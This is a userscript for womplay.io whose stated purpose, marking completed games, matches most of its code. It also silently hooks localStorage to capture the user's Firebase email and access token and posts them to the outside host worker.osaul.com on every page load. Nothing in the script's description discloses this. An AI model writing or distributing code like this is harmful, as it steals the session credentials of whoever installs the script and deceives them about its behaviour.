// ==UserScript==
// @name         womplay.io 标记完成的游戏
// @description  womplay.io 标记完成的游戏
// @version      0.1
// @author       Saul Lawliet
// @namespace    https://github.com/SaulLawliet
// @homepage     https://github.com/SaulLawliet/UserScripts/tree/master/Womplay_Mark
// @homepageURL  https://github.com/SaulLawliet/UserScripts/tree/master/Womplay_Mark
// @downloadURL  https://github.com/SaulLawliet/UserScripts/raw/master/Womplay_Mark/Womplay_Mark.user.js
// @updateURL    https://github.com/SaulLawliet/UserScripts/raw/master/Womplay_Mark/Womplay_Mark.user.js
// @match        https://womplay.io/*
// @run-at       document-idle
// @grant        GM_xmlhttpRequest
// @grant        GM_listValues
// @grant        GM_setValue
// @grant        window.onurlchange
// @connect      127.0.0.1
// @connect      worker.osaul.com
// ==/UserScript==

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms))
}

async function profile() {
  let n = 3;
  while (n > 0 && document.getElementsByClassName('table__tr ').length == 0) {
    await sleep(3000);
    n--;
  }
  for (const e of document.getElementsByClassName('table__tr ')) {
    const name = e.children[0].innerText;
    if (name == 'Earned') {
      continue
    }
    const wombucks = e.children[1].innerText;
    GM_setValue(name, wombucks);
  }
  console.log('更新收入成功');
}

async function games(className) {
  let n = 3;
  while (n > 0 && document.getElementsByClassName(className).length == 0) {
    await sleep(3000);
    n--;
  }
  const doneList = GM_listValues();
  for (const e of document.getElementsByClassName(className)) {
    if (doneList.includes(e.innerHTML)) {
      e.style = e.style.cssText + 'background-color: green;';
    }
  }
  console.log('加载游戏成功');
}

async function main() {
  const url = new URL(document.URL);
  if (url.pathname == '/' || url.pathname == '/games') {
    games('card-game-detailed__title');
    games('card-game-minified__game-title');
  } else if (url.pathname == '/profile') {
    profile();
  } else {
    console.log('Not match');
  }
}

let handled = false;

function sendToken() {
  let originalSetItem = localStorage.setItem;
  localStorage.setItem = function(key, value) {
    if (key.startsWith('firebase')) {
      let data = JSON.parse(value);
      if (!handled) {
        handled = true;
        console.log(data.email, data.stsTokenManager.accessToken);
          GM_xmlhttpRequest({
            method: "post",
            url: 'https://worker.osaul.com/womplay',
            headers: { "Content-Type": "application/json"},
            data: JSON.stringify( { email: data.email, accessToken: data.stsTokenManager.accessToken} ),
            onload: function (result) {
              console.log(result);
            }
          });
      }
    }
    originalSetItem.apply(this, arguments);
  }
}

(function () {
  'use strict';
  sendToken();

  main();

  if (window.onurlchange === null) {
    window.addEventListener('urlchange', (info) => {
      main();
    });
  }
})();
